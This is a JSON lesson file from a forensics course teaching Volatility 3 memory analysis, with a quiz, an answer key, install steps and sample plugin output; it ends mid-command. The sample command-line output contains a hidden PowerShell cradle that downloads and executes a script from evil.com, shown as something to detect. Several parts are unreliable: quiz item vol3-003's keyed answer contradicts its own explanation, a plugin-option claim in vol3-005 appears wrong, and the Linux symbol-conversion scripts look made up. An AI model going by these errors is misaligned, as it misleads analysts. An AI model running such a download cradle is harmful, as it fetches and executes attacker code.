{
  "lesson_id": "d8f7e6a5-4c3b-2a1d-9e8f-7a6b5c4d3e2f",
  "domain": "dfir",
  "title": "Volatility 3 Framework: Memory Analysis Fundamentals",
  "difficulty": 2,
  "order_index": 66,
  "prerequisites": [
    "c7d6e5f4-3b2a-1c9d-8e7f-6a5b4c3d2e1f"
  ],
  "concepts": [
    "Volatility 3 architecture and Python 3 migration",
    "Plugin system and unified interface",
    "Symbol tables and automatic OS detection",
    "Windows process analysis with pslist, pstree, psscan",
    "Memory artifact extraction and analysis workflow",
    "Volatility vs. Volatility 3 differences"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Install and configure Volatility 3 framework on Windows and Linux",
    "Understand Volatility 3 architecture changes from Volatility 2",
    "Use core plugins for process enumeration and analysis",
    "Extract memory artifacts using Volatility 3 commands",
    "Interpret plugin output to identify suspicious processes",
    "Build a systematic memory analysis workflow with Volatility 3"
  ],
  "post_assessment": [
    {
      "question_id": "vol3-001",
      "question": "What is the PRIMARY architectural difference between Volatility 2 and Volatility 3?",
      "options": [
        "Volatility 3 uses Python 2, while Volatility 2 uses Python 3",
        "Volatility 3 has a unified plugin interface and automatic symbol downloading, while Volatility 2 requires manual profile installation",
        "Volatility 3 only supports Windows, while Volatility 2 supports multiple operating systems",
        "Volatility 3 is closed-source commercial software, while Volatility 2 is open-source"
      ],
      "correct_answer": 1,
      "explanation": "Volatility 3's major improvement is its unified plugin interface with automatic symbol table downloading from Microsoft's symbol servers. Volatility 2 required manual profile installation for each Windows version (Win7SP1x64, Win10x64_19041, etc.), which was cumbersome. Volatility 3 auto-detects the OS and downloads necessary symbols on-demand, significantly streamlining analysis. It uses Python 3 (not 2), supports multiple OSes (Windows, Linux, macOS), and remains open-source.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "vol3-002",
      "question": "You run 'python vol.py -f memory.dmp windows.pslist' and see a process with PPID 4 (System). Which of these processes would be NORMAL with this parent?",
      "options": [
        "powershell.exe with PPID 4",
        "smss.exe with PPID 4",
        "explorer.exe with PPID 4",
        "cmd.exe with PPID 4"
      ],
      "correct_answer": 1,
      "explanation": "smss.exe (Session Manager Subsystem) is the ONLY legitimate process that has System (PID 4) as its parent. It's the first user-mode process started by the kernel and is responsible for creating session 0 and session 1. It launches csrss.exe and wininit.exe (session 0) and csrss.exe and winlogon.exe (session 1), then exits. ALL other processes with PPID 4 are HIGHLY SUSPICIOUS and indicate process hollowing, DKOM (Direct Kernel Object Manipulation), or parent PID spoofing attacks. Powershell.exe, explorer.exe, and cmd.exe should NEVER have System as their parent.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "vol3-003",
      "question": "In Volatility 3 output, you see a process listed in 'windows.pslist' but NOT in 'windows.psscan'. What does this indicate?",
      "options": [
        "The process is currently running and active",
        "The process is hidden using rootkit techniques (DKOM)",
        "The process has exited and been removed from the active process list",
        "This is normal behavior and indicates no issues"
      ],
      "correct_answer": 0,
      "explanation": "This is actually a TRICK question based on understanding the difference between pslist and psscan. Pslist walks the doubly-linked list of EPROCESS structures starting from PsActiveProcessHead (kernel structure). Psscan uses pool tag scanning to find EPROCESS structures by searching for 'Proc' pool tags throughout memory. A process in pslist but NOT in psscan is UNUSUAL but indicates the process is in the active list but its EPROCESS structure is not being detected by pool scanning (possibly due to memory corruption, paging, or the structure being in a non-paged area). However, the REVERSE (in psscan but NOT pslist) indicates a HIDDEN process using rootkit techniques - the EPROCESS exists in memory but has been unlinked from the active process list via DKOM. The question is testing whether you understand these tools correctly.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "vol3-004",
      "question": "You need to analyze a Windows 11 memory dump from March 2024. What command prepares Volatility 3 for analysis?",
      "options": [
        "vol.py --info | grep Win11 to check if the profile exists, then vol.py --profile=Win11x64_22631 -f memory.dmp windows.pslist",
        "Download the Win11_22631 profile from GitHub, place it in volatility/plugins/overlays/windows/, then run analysis",
        "Simply run: python vol.py -f memory.dmp windows.pslist (Volatility 3 auto-detects and downloads symbols)",
        "Run vol.py --update-profiles to download all Windows 11 profiles before analysis"
      ],
      "correct_answer": 2,
      "explanation": "Volatility 3's BIGGEST IMPROVEMENT is automatic OS detection and symbol downloading. You simply point it at the memory dump and run your plugin - Volatility 3 will: (1) Identify the OS version from kernel structures, (2) Download necessary symbol files (PDB) from Microsoft's symbol server automatically, (3) Cache symbols locally for future use. NO manual profile installation required! Options A, B, and D describe the OLD Volatility 2 workflow, which is obsolete. This auto-detection works for Windows 10/11, Server 2016/2019/2022, and even insider builds, making Volatility 3 FAR more user-friendly than Volatility 2.",
      "type": "multiple_choice",
      "difficulty": 1
    },
    {
      "question_id": "vol3-005",
      "question": "What is the CORRECT command syntax to analyze process command-line arguments in Volatility 3?",
      "options": [
        "python vol.py -f memory.dmp windows.cmdline --pid 1234",
        "python vol.py -f memory.dmp windows.pslist.CmdLine",
        "python vol.py -f memory.dmp windows.cmdline.CmdLine --pid 1234",
        "python vol.py -f memory.dmp windows.cmdline"
      ],
      "correct_answer": 3,
      "explanation": "Volatility 3 uses the plugin syntax: windows.cmdline (no .CmdLine suffix, no --pid filter in most cases). The correct command is simply 'python vol.py -f memory.dmp windows.cmdline' which displays ALL processes with their full command-line arguments. Volatility 3 plugins often don't support --pid filtering at the plugin level (you filter output using grep/findstr instead). Option A incorrectly uses --pid (not supported by this plugin). Option B uses old Volatility 2 syntax with .CmdLine suffix. Option C combines both mistakes. The actual output shows PID, Process, and Args columns for all processes, which is invaluable for detecting malicious PowerShell, encoded commands, or suspicious arguments.",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Welcome to the World of Memory Forensics with Volatility 3! ğŸš€\n\nYou're about to master **the most powerful memory analysis framework in cybersecurity**. Volatility 3 is the tool that:\n\n- **Uncovered the SolarWinds backdoor** in RAM when disk forensics found nothing\n- **Identified WannaCry's kill switch mechanism** by analyzing memory-resident encryption keys\n- **Exposed APT29's fileless malware** that existed ONLY in memory, never touching disk\n\n**Why does memory forensics matter?**\n\nImagine investigating a system where:\n- âœ… Antivirus shows: \"No threats detected\"\n- âœ… Disk forensics shows: \"No malware found\"\n- âœ… Event logs show: \"Nothing unusual\"\n\nBut the attacker is STILL THERE, running code in RAM, stealing credentials, exfiltrating data.\n\n**Memory forensics reveals what NOTHING ELSE can**: active malware, decrypted keys, injected code, hidden processes, network connections, and attacker commands.\n\n**This lesson is your foundation.** You'll learn Volatility 3 from installation to practical analysis. By the end, you'll be extracting artifacts from memory dumps like a seasoned incident responder.\n\n**Let's dive in!** ğŸ”"
      }
    },
    {
      "type": "video",
      "content": {
        "text": "**Video: Memory Forensics with Volatility - 13Cubed**\\n\\n**Duration**: 25:15\\n\\nThis video provides a visual demonstration of the concepts covered in this lesson. Watch to see practical examples and deepen your understanding of Volatility 3 Framework: Memory Analysis Fundamentals.\\n\\n**Video Link**: [Memory Forensics with Volatility - 13Cubed](https://www.youtube.com/watch?v=BMFCdAGxVN4)\\n\\n**Embedded Video**:\\n\\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/BMFCdAGxVN4\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\\n\\n**Learning Tips**:\\n- Watch the video first to get an overview\\n- Pause and take notes on key concepts\\n- Replay sections that cover complex topics\\n- Try to practice along with the video demonstrations\\n- Return to the video as needed while working through exercises",
        "url": "https://www.youtube.com/watch?v=BMFCdAGxVN4",
        "title": "Memory Forensics with Volatility - 13Cubed",
        "duration": "25:15"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Volatility 3 Framework: Architecture and Fundamentals\n\n## What is Volatility?\n\nVolatility is an **open-source memory forensics framework** written in Python that analyzes volatile memory (RAM) dumps from Windows, Linux, and macOS systems. It's the **industry standard** for memory analysis, used by:\n\n- FBI Cyber Division\n- NSA Cybersecurity Operations\n- SANS DFIR teams\n- Major incident response firms (Mandiant, CrowdStrike, etc.)\n- Law enforcement worldwide (child exploitation, cybercrime investigations)\n\n**Developed by**: The Volatility Foundation (Aaron Walters, Michael Hale Ligh, et al.)\n\n**Open source**: Free, community-driven, actively maintained\n\n**Current version**: Volatility 3 (complete rewrite from Volatility 2)\n\n---\n\n## Volatility 2 vs. Volatility 3: What Changed?\n\n### Volatility 2 (Legacy - Still Widely Used)\n\n**Pros**:\n- Mature plugin ecosystem (100+ plugins)\n- Extensive community documentation\n- Well-tested on older Windows versions (XP, Vista, 7)\n\n**Cons**:\n- âŒ Python 2 (EOL since 2020)\n- âŒ Manual profile installation (painful!)\n- âŒ Profiles needed for EVERY Windows build (Win7SP1x64, Win10x64_19041, Win10x64_19042, etc.)\n- âŒ Outdated architecture\n- âŒ Slow development\n\n**Example workflow** (tedious):\n\n```bash\n# 1. Identify Windows version from memory dump\nvol.py -f memory.dmp imageinfo\n# Output: Suggested Profile(s) : Win10x64_19041, Win10x64_18362, Win10x64_17134\n\n# 2. Download correct profile from GitHub (if it exists)\nwget https://github.com/volatilityfoundation/profiles/Win10x64_19041.zip\n\n# 3. Install profile\nunzip Win10x64_19041.zip -d volatility/plugins/overlays/windows/\n\n# 4. FINALLY run analysis\nvol.py --profile=Win10x64_19041 -f memory.dmp pslist\n```\n\n**If the profile doesn't exist?** You had to BUILD IT YOURSELF using a matching Windows VM (extremely painful).\n\n---\n\n### Volatility 3 (Modern - Recommended for New Work)\n\n**Pros**:\n- âœ… Python 3 (modern, maintained)\n- âœ… **Automatic symbol table downloading** (HUGE improvement!)\n- âœ… No manual profile installation\n- âœ… Unified plugin interface\n- âœ… Cleaner architecture\n- âœ… Better performance\n- âœ… JSON output support (for automation)\n\n**Cons**:\n- Smaller plugin ecosystem (catching up fast)\n- Some advanced Volatility 2 plugins not yet ported\n- Less community documentation (improving)\n\n**Example workflow** (simple):\n\n```bash\n# 1. Run analysis (Volatility 3 auto-detects OS and downloads symbols)\npython vol.py -f memory.dmp windows.pslist\n\n# Done! No profile installation needed!\n```\n\n**Volatility 3 automatically**:\n1. Identifies the Windows version from kernel structures\n2. Downloads the correct symbol files (PDB) from Microsoft's symbol server\n3. Caches symbols locally (`~/.cache/volatility3/symbols/`)\n4. Runs the analysis\n\n**This is a GAME-CHANGER for incident response!**\n\n---\n\n## Volatility 3 Architecture\n\n### Core Components\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                  VOLATILITY 3 FRAMEWORK                 â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  CLI Interface (vol.py)                                 â”‚\nâ”‚  â”œâ”€â”€ Argument parsing                                   â”‚\nâ”‚  â”œâ”€â”€ Plugin loader                                      â”‚\nâ”‚  â””â”€â”€ Output renderer (text, JSON, CSV)                 â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  Symbol Tables & Type Information                       â”‚\nâ”‚  â”œâ”€â”€ Windows PDB symbols (auto-downloaded)             â”‚\nâ”‚  â”œâ”€â”€ Linux DWARF symbols                                â”‚\nâ”‚  â””â”€â”€ macOS DWARF symbols                                â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  Plugins (Analysis Modules)                             â”‚\nâ”‚  â”œâ”€â”€ windows.*    (Windows-specific)                    â”‚\nâ”‚  â”œâ”€â”€ linux.*      (Linux-specific)                      â”‚\nâ”‚  â”œâ”€â”€ mac.*        (macOS-specific)                      â”‚\nâ”‚  â””â”€â”€ generic.*    (OS-agnostic)                         â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  Core Framework                                         â”‚\nâ”‚  â”œâ”€â”€ Address space abstraction (virtual/physical)      â”‚\nâ”‚  â”œâ”€â”€ Object parsing (structs, pointers)                â”‚\nâ”‚  â”œâ”€â”€ Layer system (stacked address spaces)             â”‚\nâ”‚  â””â”€â”€ Scanning algorithms (pool tag, YARA)              â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  Memory Dump (Input)                                    â”‚\nâ”‚  â””â”€â”€ .raw, .mem, .dmp, .vmem, .core files              â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### Key Concepts\n\n**1. Address Spaces**\n\nVolatility 3 abstracts memory as \"layers\":\n\n- **Physical Layer**: Raw memory dump (physical addresses)\n- **Virtual Layer**: Process virtual address spaces (requires page table translation)\n- **Intel Layer**: x86/x64-specific address translation\n\n**Example**: When analyzing a process, Volatility:\n1. Reads the EPROCESS structure from physical memory\n2. Extracts the DirectoryTableBase (DTB) - pointer to page tables\n3. Constructs a virtual address space for that process\n4. Reads process memory using virtual addresses\n\n**2. Symbol Tables**\n\nSymbol tables map kernel structure offsets to field names.\n\n**Without symbols**:\n```python\n# You see raw hex offsets\nstruct_data = read_memory(0x1000)\nprocess_name = struct_data[0x2e0:0x2ef]  # Magic offset - what is this?\n```\n\n**With symbols**:\n```python\n# Human-readable structure access\neprocess = read_structure(\"_EPROCESS\", 0x1000)\nprocess_name = eprocess.ImageFileName  # Clear and maintainable!\n```\n\nVolatility 3 downloads symbols from:\n- **Windows**: Microsoft Symbol Server (`https://msdl.microsoft.com/download/symbols`)\n- **Linux**: System.map files (manual import)\n- **macOS**: DWARF debug symbols (manual import)\n\n**3. Plugins**\n\nPlugins are analysis modules that extract specific artifacts.\n\n**Plugin naming convention**: `<os>.<category>.<name>`\n\n**Examples**:\n- `windows.pslist` - List active processes (walk EPROCESS linked list)\n- `windows.psscan` - Scan for hidden processes (pool tag scanning)\n- `windows.cmdline` - Extract process command-line arguments\n- `windows.netscan` - Network connections and sockets\n- `linux.bash` - Extract bash history from memory\n\n**Unified interface**: All plugins follow the same structure:\n\n```bash\npython vol.py -f <memory_dump> <plugin_name> [options]\n```\n\n---\n\n## Installation and Setup\n\n### Option 1: Install from PyPI (Recommended)\n\n```bash\n# Install Volatility 3 via pip (Python 3.7+)\npip3 install volatility3\n\n# Verify installation\nvol3 --help\n# or\npython -m volatility3 --help\n```\n\n### Option 2: Install from GitHub (Development Version)\n\n```bash\n# Clone repository\ngit clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3\n\n# Install dependencies\npip3 install -r requirements.txt\n\n# Run Volatility 3\npython vol.py --help\n```\n\n### Option 3: Use Pre-Built Docker Container\n\n```bash\n# Pull official Docker image\ndocker pull phocean/volatility3\n\n# Run analysis\ndocker run --rm -v /path/to/dumps:/dumps phocean/volatility3 -f /dumps/memory.dmp windows.pslist\n```\n\n### Option 4: SANS SIFT Workstation (Pre-Installed)\n\nThe SANS SIFT (SANS Investigative Forensic Toolkit) workstation includes Volatility 3 pre-configured:\n\n```bash\n# Download SIFT\nwget https://github.com/teamdfir/sift-cli/releases/download/v1.14.0-rc1/sift-cli-linux\n\n# Install SIFT\nsudo bash sift-cli-linux install\n\n# Volatility 3 is now available\nvol3 --help\n```\n\n---\n\n## Symbol Table Setup\n\n### Windows Symbols (Automatic)\n\nVolatility 3 automatically downloads Windows symbols from Microsoft's server:\n\n```bash\n# First run - downloads symbols\npython vol.py -f windows10_memory.dmp windows.pslist\n# Output: Downloading PDB symbols for ntoskrnl.exe (build 19041)...\n# Progress: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100%\n\n# Subsequent runs - uses cached symbols\npython vol.py -f windows10_memory.dmp windows.pslist\n# Output: Using cached symbols...\n```\n\n**Symbol cache location**:\n- Linux/macOS: `~/.cache/volatility3/symbols/`\n- Windows: `%LOCALAPPDATA%\\volatility3\\symbols\\`\n\n**Manual symbol download** (for air-gapped systems):\n\n```bash\n# Download symbols on internet-connected system\npython vol.py -f memory.dmp banners.Banners\n# Symbols downloaded to ~/.cache/volatility3/symbols/\n\n# Copy symbols to air-gapped system\ntar -czf symbols.tar.gz ~/.cache/volatility3/symbols/\nscp symbols.tar.gz airgap-system:/home/analyst/\n\n# Extract on air-gapped system\ntar -xzf symbols.tar.gz -C ~/.cache/volatility3/\n```\n\n### Linux Symbols (Manual Import)\n\nLinux requires System.map or DWARF symbols:\n\n```bash\n# On target Linux system, locate System.map\nls /boot/System.map-*\n# /boot/System.map-5.15.0-58-generic\n\n# Copy to Volatility symbols directory\ncp /boot/System.map-5.15.0-58-generic ~/.cache/volatility3/symbols/linux/\n\n# Rename to match kernel version\nmv System.map-5.15.0-58-generic System.map-5.15.0-58-generic.json\n\n# Create JSON symbol file (convert format)\npython volatility3/framework/symbols/linux/LinuxUtilities.py /boot/System.map-5.15.0-58-generic > ~/.cache/volatility3/symbols/linux/5.15.0-58-generic.json\n```\n\n**Alternatively**, use DWARF debug info:\n\n```bash\n# Extract DWARF from kernel\ndwarfdump /usr/lib/debug/boot/vmlinux-5.15.0-58-generic > kernel.dwarf\n\n# Convert to Volatility JSON format\npython volatility3/framework/symbols/linux/dwarf.py kernel.dwarf > ~/.cache/volatility3/symbols/linux/5.15.0-58-generic.json\n```\n\n---\n\n## Basic Volatility 3 Commands\n\n### List Available Plugins\n\n```bash\n# Show all available plugins\npython vol.py --help\n\n# Filter to Windows plugins\npython vol.py --help | grep windows\n\n# Filter to process-related plugins\npython vol.py --help | grep -i process\n```\n\n**Output excerpt**:\n```\nwindows.pslist.PsList       List all processes\nwindows.psscan.PsScan       Scan for hidden processes\nwindows.pstree.PsTree       Process tree\nwindows.cmdline.CmdLine     Process command lines\nwindows.envars.Envars       Process environment variables\nwindows.dlllist.DllList     Process DLLs\nwindows.handles.Handles     Process handles\nwindows.memmap.Memmap       Process memory map\n```\n\n### Get Plugin-Specific Help\n\n```bash\n# Show detailed help for a specific plugin\npython vol.py -f memory.dmp windows.pslist --help\n```\n\n**Output**:\n```\nusage: vol.py windows.pslist [-h] [--pid PID [PID ...]] [--physical] [--dump]\n\nLists the processes present in a particular windows memory image.\n\noptional arguments:\n  -h, --help           show this help message and exit\n  --pid PID [PID ...]  Process IDs to include (all other processes are excluded)\n  --physical           Display physical offsets instead of virtual\n  --dump               Extract listed processes to disk\n```\n\n### Basic Information Gathering\n\n```bash\n# 1. Identify OS version and system info\npython vol.py -f memory.dmp windows.info\n\n# 2. Display kernel banner (quick OS identification)\npython vol.py -f memory.dmp banners.Banners\n\n# 3. List all available layers (address spaces)\npython vol.py -f memory.dmp windows.memmap.Memmap --pid 4\n```\n\n---\n\n## Core Process Analysis Plugins\n\n### 1. windows.pslist - Active Process List\n\n**What it does**: Walks the doubly-linked list of EPROCESS structures starting from `PsActiveProcessHead` (kernel global variable).\n\n**Command**:\n```bash\npython vol.py -f memory.dmp windows.pslist\n```\n\n**Output**:\n```\nPID     PPID    ImageFileName           Offset(V)       Threads Handles SessionId       Wow64   CreateTime                      ExitTime\n\n4       0       System                  0x82042c40      116     603     N/A             False   2024-03-15 08:12:34.000000      N/A\n384     4       smss.exe                0x85a3f030      2       29      N/A             False   2024-03-15 08:12:34.000000      N/A\n472     464     csrss.exe               0x89e88d40      10      437     0               False   2024-03-15 08:12:38.000000      N/A\n520     464     wininit.exe             0x89f2c8a0      1       76      0               False   2024-03-15 08:12:39.000000      N/A\n528     512     csrss.exe               0x89f36d40      11      335     1               False   2024-03-15 08:12:39.000000      N/A\n576     512     winlogon.exe            0x89fa1900      4       119     1               False   2024-03-15 08:12:40.000000      N/A\n644     520     services.exe            0x8a121030      8       219     0               False   2024-03-15 08:12:41.000000      N/A\n652     520     lsass.exe               0x8a128980      9       626     0               False   2024-03-15 08:12:41.000000      N/A\n744     644     svchost.exe             0x8a2a4d40      20      462     0               False   2024-03-15 08:12:42.000000      N/A\n```\n\n**Key fields**:\n- **PID**: Process ID (unique identifier)\n- **PPID**: Parent Process ID (who spawned this process)\n- **ImageFileName**: Process name (max 15 characters - can be truncated!)\n- **Offset(V)**: Virtual address of EPROCESS structure\n- **Threads**: Number of threads\n- **Handles**: Number of open handles (files, registry keys, mutexes, etc.)\n- **SessionId**: Session (0 = services, 1+ = user sessions)\n- **Wow64**: True if 32-bit process on 64-bit OS\n- **CreateTime**: When process started\n- **ExitTime**: When process exited (if terminated)\n\n**Forensic significance**:\n- Identifies all ACTIVE processes (as of memory capture time)\n- Parent-child relationships (PPID) reveal process execution chains\n- CreateTime establishes timeline\n- ExitTime shows recently terminated processes (if EPROCESS still in memory)\n\n**Limitations**:\n- Only shows processes in the active linked list\n- **Rootkits can unlink processes from the list (DKOM attack)** - hidden processes won't appear!\n- Recently exited processes may not be included (if EPROCESS deallocated)\n\n---\n\n### 2. windows.psscan - Hidden Process Detection\n\n**What it does**: Scans physical memory for EPROCESS structures using **pool tag scanning**. Finds processes even if they've been unlinked from the active list.\n\n**Command**:\n```bash\npython vol.py -f memory.dmp windows.psscan\n```\n\n**How it works**:\n\n1. Windows allocates EPROCESS structures from kernel pool memory\n2. Each allocation is tagged with a 4-byte signature: `Proc` (or `Pro\\xe3` in hex)\n3. Volatility scans all physical memory for these pool tags\n4. When found, validates the structure (checks for valid pointers, magic values, etc.)\n5. Extracts process information\n\n**Output** (similar to pslist, but may include hidden processes):\n```\nPID     PPID    ImageFileName           Offset(P)       Threads Handles SessionId       Wow64   CreateTime                      ExitTime\n\n4       0       System                  0x1f042c40      116     603     N/A             False   2024-03-15 08:12:34.000000      N/A\n384     4       smss.exe                0x23a3f030      2       29      N/A             False   2024-03-15 08:12:34.000000      N/A\n...\n2048    1024    evil.exe                0x5f328a00      3       12      1               False   2024-03-15 14:35:22.000000      N/A\n```\n\n**Detecting hidden processes**:\n\n```bash\n# Compare pslist vs psscan\npython vol.py -f memory.dmp windows.pslist > pslist.txt\npython vol.py -f memory.dmp windows.psscan > psscan.txt\n\n# Find processes in psscan but NOT in pslist (hidden processes)\ngrep -vFf pslist.txt psscan.txt\n```\n\n**If a process appears in psscan but NOT pslist â†’ ROOTKIT/MALWARE!**\n\n---\n\n### 3. windows.pstree - Process Tree Visualization\n\n**What it does**: Displays processes in a hierarchical tree showing parent-child relationships.\n\n**Command**:\n```bash\npython vol.py -f memory.dmp windows.pstree\n```\n\n**Output**:\n```\nPID     PPID    ImageFileName           Threads Handles\n\n4       0       System                  116     603\n* 384   4       smss.exe                2       29\n** 472  384     csrss.exe               10      437\n** 520  384     wininit.exe             1       76\n*** 644 520     services.exe            8       219\n**** 744 644    svchost.exe             20      462\n**** 836 644    svchost.exe             15      301\n**** 912 644    svchost.exe             42      682\n** 528  384     csrss.exe               11      335\n** 576  384     winlogon.exe            4       119\n*** 1024 576    userinit.exe            2       45\n**** 1084 1024  explorer.exe            33      987\n***** 2156 1084 cmd.exe                 1       23\n****** 2304 2156 evil.exe               3       12\n```\n\n**Forensic value**:\n- Visualize attack chains (e.g., `explorer.exe â†’ cmd.exe â†’ powershell.exe â†’ malware.exe`)\n- Identify abnormal parent-child relationships:\n  - âŒ `explorer.exe` spawning `cmd.exe` with encoded PowerShell (suspicious!)\n  - âŒ `winlogon.exe` spawning `notepad.exe` (abnormal!)\n  - âŒ `svchost.exe` spawning `powershell.exe` (highly suspicious!)\n- Establish execution timeline (top-down = chronological)\n\n---\n\n### 4. windows.cmdline - Command-Line Arguments\n\n**What it does**: Extracts full command-line arguments for each process (from PEB â†’ ProcessParameters â†’ CommandLine).\n\n**Command**:\n```bash\npython vol.py -f memory.dmp windows.cmdline\n```\n\n**Output**:\n```\nPID     Process         Args\n\n4       System          N/A\n384     smss.exe        \\SystemRoot\\System32\\smss.exe\n472     csrss.exe       %SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3\n644     services.exe    C:\\Windows\\system32\\services.exe\n744     svchost.exe     C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p\n1084    explorer.exe    C:\\Windows\\Explorer.EXE\n2156    cmd.exe         \"C:\\Windows\\System32\\cmd.exe\" \n2304    powershell.exe  \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"\n```\n\n**CRITICAL for detecting**:\n- Encoded PowerShell commands (`-EncodedCommand`, `-enc`, `-e`)\n- Downloaded scripts (`IEX`, `Invoke-Expression`, `DownloadString`)\n- Bypassed execution policies (`-ExecutionPolicy Bypass`)\n- Hidden windows (`-WindowStyle Hidden`, `-W Hidden`)\n- Suspicious file paths (`C:\\Temp\\\\malware.exe`, `C:\\Users\\Public\\\\evil.exe`)\n- Living-off-the-land binaries (LOLBins) with unusual arguments\n\n**Example detection**:\n```bash\n# Find encoded PowerShell commands\npython vol.py -f memory.dmp windows.cmdline | grep -i \"encodedcommand\"\n\n# Find download/execution commands\npython vol.py -f memory.dmp windows.cmdline | grep -iE \"(downloadstring|iex|invoke-expression)\"\n```\n\n---\n\n## Practical Workflow: Analyzing a Memory Dump\n\n### Step 1: Verify Memory Dump Integrity\n\n```bash\n# Calculate hash (for chain of custody)\nsha256sum memory.dmp > memory.dmp.sha256\n\n# Verify file size and format\nfile memory.dmp\n# Output: memory.dmp: MS Windows 64bit crash dump, version 15.19041, 16777216 pages\n\n# Check if dump is complete\nls -lh memory.dmp\n# Output: -rw-r--r-- 1 analyst analyst 16G Mar 15 14:45 memory.dmp\n```\n\n### Step 2: Identify OS Version\n\n```bash\n# Quick OS identification\npython vol.py -f memory.dmp banners.Banners\n```\n\n**Output**:\n```\nBanners:\n  Windows 10 Version 19041 (Build 19041.1151)\n  NT Kernel Version 10.0 Build 19041 x64\n  System Uptime: 3 days, 14:23:17\n```\n\n### Step 3: Process Analysis\n\n```bash\n# List all processes\npython vol.py -f memory.dmp windows.pslist > pslist.txt\n\n# Scan for hidden processes\npython vol.py -f memory.dmp windows.psscan > psscan.txt\n\n# Compare to find hidden processes\ncomm -13 <(sort pslist.txt) <(sort psscan.txt) > hidden_processes.txt\n\n# View process tree\npython vol.py -f memory.dmp windows.pstree > pstree.txt\n\n# Extract command lines\npython vol.py -f memory.dmp windows.cmdline > cmdline.txt\n```\n\n### Step 4: Analyze Suspicious Processes\n\n**Indicators of compromise in process list**:\n\n1. **Abnormal parent-child relationships**:\n   - `explorer.exe` â†’ `cmd.exe` â†’ `powershell.exe` (lateral movement)\n   - `winword.exe` â†’ `powershell.exe` (macro execution)\n   - `svchost.exe` â†’ `notepad.exe` (process injection)\n\n2. **Suspicious process names**:\n   - Misspellings: `svchosl.exe`, `svch0st.exe`, `iexplore.exe` (note: legitimate is `iexplore.exe` with TWO processes per tab)\n   - Wrong paths: `C:\\Temp\\svchost.exe` (should be `C:\\Windows\\System32\\svchost.exe`)\n   - Unusual names: `update.exe`, `system32.exe`, `microsoft.exe`\n\n3. **Encoded commands**:\n   - PowerShell with `-EncodedCommand`\n   - Base64-encoded strings in command line\n   - Obfuscated scripts\n\n4. **Network indicators**:\n   - Unexpected processes with network connections\n   - Connections to known-bad IPs/domains\n\n**Example investigation**:\n\n```bash\n# Investigate PID 2304 (suspicious PowerShell)\npython vol.py -f memory.dmp windows.cmdline | grep \"2304\"\n# Output: 2304    powershell.exe  